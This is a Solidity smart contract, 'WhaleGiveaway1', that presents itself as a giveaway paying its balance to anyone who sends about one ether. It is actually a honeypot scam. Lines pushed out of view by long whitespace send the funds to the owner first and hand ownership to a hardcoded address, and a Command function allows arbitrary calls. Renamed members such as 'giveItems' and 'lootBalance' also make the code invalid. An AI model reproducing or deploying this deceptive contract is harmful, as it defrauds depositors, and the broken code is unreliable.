pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public DungeonMaster = msg.sender;
    uint constant public minEligibility = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function redeem()
    public
    payable
    {
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    DungeonMaster.giveItems(this.lootBalance);
            msg.sender.giveItems(this.lootBalance);
        }
    }

    function claimLoot()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){DungeonMaster=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == DungeonMaster);
        DungeonMaster.giveItems(this.lootBalance);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == DungeonMaster);
        adr.call.value(msg.value)(data);
    }
}